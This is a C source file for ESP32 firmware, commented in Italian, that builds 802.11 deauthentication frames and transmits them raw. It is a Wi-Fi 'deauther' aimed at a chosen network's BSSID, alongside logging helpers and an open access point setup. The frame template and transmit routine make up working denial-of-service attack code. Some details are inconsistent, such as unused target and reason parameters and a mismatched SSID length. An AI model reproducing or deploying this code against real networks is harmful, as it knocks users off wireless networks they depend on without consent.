#include "deauth.h"
#include "esp_log.h"
#include <string.h>

#define TASK_NAME "spam_task"

uint16_t seqnum;
uint8_t buffer[200];


    // PARAMETRO .authmode
void print_auth_mode(int authmode)
{
    switch (authmode) {
    case WIFI_AUTH_OPEN:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_OPEN");
        break;
    case WIFI_AUTH_OWE:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_OWE");
        break;
    case WIFI_AUTH_WEP:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WEP");
        break;
    case WIFI_AUTH_WPA_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA_PSK");
        break;
    case WIFI_AUTH_WPA2_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA2_PSK");
        break;
    case WIFI_AUTH_WPA_WPA2_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA_WPA2_PSK");
        break;
    case WIFI_AUTH_ENTERPRISE:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_ENTERPRISE");
        break;
    case WIFI_AUTH_WPA3_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_PSK");
        break;
    case WIFI_AUTH_WPA2_WPA3_PSK:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA2_WPA3_PSK");
        break;
    case WIFI_AUTH_WPA3_ENT_192:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_ENT_192");
        break;
    default:
        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_UNKNOWN");
        break;
    }
}
// stessi parametri del nome
void print_cipher_type(int pairwise_cipher, int group_cipher)
{
    switch (pairwise_cipher) {
    case WIFI_CIPHER_TYPE_NONE:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_NONE");
        break;
    case WIFI_CIPHER_TYPE_WEP40:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_WEP40");
        break;
    case WIFI_CIPHER_TYPE_WEP104:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_WEP104");
        break;
    case WIFI_CIPHER_TYPE_TKIP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_TKIP");
        break;
    case WIFI_CIPHER_TYPE_CCMP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_CCMP");
        break;
    case WIFI_CIPHER_TYPE_TKIP_CCMP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_TKIP_CCMP");
        break;
    case WIFI_CIPHER_TYPE_AES_CMAC128:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_AES_CMAC128");
        break;
    case WIFI_CIPHER_TYPE_SMS4:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_SMS4");
        break;
    case WIFI_CIPHER_TYPE_GCMP:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_GCMP");
        break;
    case WIFI_CIPHER_TYPE_GCMP256:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_GCMP256");
        break;
    default:
        ESP_LOGI(TASK_NAME, "Pairwise Cipher \tWIFI_CIPHER_TYPE_UNKNOWN");
        break;
    }

    switch (group_cipher) {
    case WIFI_CIPHER_TYPE_NONE:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_NONE");
        break;
    case WIFI_CIPHER_TYPE_WEP40:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_WEP40");
        break;
    case WIFI_CIPHER_TYPE_WEP104:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_WEP104");
        break;
    case WIFI_CIPHER_TYPE_TKIP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_TKIP");
        break;
    case WIFI_CIPHER_TYPE_CCMP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_CCMP");
        break;
    case WIFI_CIPHER_TYPE_TKIP_CCMP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_TKIP_CCMP");
        break;
    case WIFI_CIPHER_TYPE_SMS4:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_SMS4");
        break;
    case WIFI_CIPHER_TYPE_GCMP:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_GCMP");
        break;
    case WIFI_CIPHER_TYPE_GCMP256:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_GCMP256");
        break;
    default:
        ESP_LOGI(TASK_NAME, "Group Cipher \tWIFI_CIPHER_TYPE_UNKNOWN");
        break;
    }
}


const uint8_t deauthPacket[] = {
    0xc0, 0x00, 0x3a, 0x01,  //vari header tipo pacchetto c0 -> deauth wifi frame
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //broadcast default
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid del target
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid del target
    0xf0, 0xff, 0x06, 0x00 //reason code sss
};

esp_err_t deauth(const MacAddr target, const MacAddr source,
        const MacAddr bssid, uint8_t reason, uint8_t channel) {
    
    //esp_err_t res = esp32_deauther_configure_wifi(channel);

    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[10], bssid , 6);
    memcpy(&buffer[16], bssid, 6);

    seqnum++;
    // for(int i=0; i<sizeof(deauthPacket);i++){
    //     ESP_LOGI(TASK_NAME, "packet byte %d:  %x ", i, buffer[i]);
    // }
    ESP_LOGI(TASK_NAME, "pacchetto deauth");
    esp_err_t res = raw(buffer, sizeof(deauthPacket), false);
    ESP_LOGI(TASK_NAME, "result: %s", esp_err_to_name(res));

    return res;
    
}

esp_err_t raw(const uint8_t* packet, int32_t len, bool en_sys_seq) {
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
}

esp_err_t esp32_deauther_configure_wifi(uint8_t channel){
    wifi_config_t ap_config = {};
    strcpy((char*)ap_config.ap.ssid,"Prosciutto wifi");
    ap_config.ap.ssid_len = 10;
    ap_config.ap.channel = channel;
    ap_config.ap.authmode = WIFI_AUTH_OPEN,
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 60000;

    return esp_wifi_set_config(WIFI_IF_AP, &ap_config);
}



